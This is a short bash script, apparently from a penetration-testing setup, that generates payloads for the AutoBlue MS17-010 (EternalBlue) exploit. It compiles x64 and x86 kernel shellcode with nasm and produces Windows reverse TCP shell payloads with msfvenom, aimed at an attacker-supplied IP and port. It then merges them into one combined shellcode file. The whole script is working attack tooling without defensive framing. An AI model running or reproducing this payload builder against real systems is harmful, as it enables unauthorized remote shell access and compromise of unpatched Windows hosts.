#!/bin/bash

if [ $# -eq 2  ]
then
	ip=$1
	port=$2

	echo 'Compiling x64 kernel shellcode'
	nasm -f bin ./AutoBlue-MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./AutoBlue-MS17-010/shellcode/sc_x64_kernel.bin
	echo 'Compiling x86 kernel shellcode'
	nasm -f bin ./AutoBlue-MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./AutoBlue-MS17-010/shellcode/sc_x86_kernel.bin

	echo Generating x64 cmd shell \(stageless\)...
	echo
	echo msfvenom -p windows/x64/shell_reverse_tcp -f raw -o ./AutoBlue-MS17-010/shellcode/sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$port
	msfvenom -p windows/x64/shell_reverse_tcp -f raw -o ./AutoBlue-MS17-010/shellcode/sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$port
	echo
	echo Generating x86 cmd shell \(stageless\)...
	echo
	echo msfvenom -p windows/shell_reverse_tcp -f raw -o ./AutoBlue-MS17-010/shellcode/sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$port
	msfvenom -p windows/shell_reverse_tcp -f raw -o ./AutoBlue-MS17-010/shellcode/sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$port

	cat ./AutoBlue-MS17-010/shellcode/sc_x64_kernel.bin ./AutoBlue-MS17-010/shellcode/sc_x64_msf.bin > ./AutoBlue-MS17-010/shellcode/sc_x64.bin
	cat ./AutoBlue-MS17-010/shellcode/sc_x86_kernel.bin ./AutoBlue-MS17-010/shellcode/sc_x86_msf.bin > ./AutoBlue-MS17-010/shellcode/sc_x86.bin
	python3 ./AutoBlue-MS17-010/shellcode/eternalblue_sc_merge.py ./AutoBlue-MS17-010/shellcode/sc_x86.bin ./AutoBlue-MS17-010/shellcode/sc_x64.bin ./AutoBlue-MS17-010/shellcode/sc_all.bin
else
	echo "Ejecutalo asi:"
	echo -e "\t./gen_payload.sh <ip-address> <port>"
fi
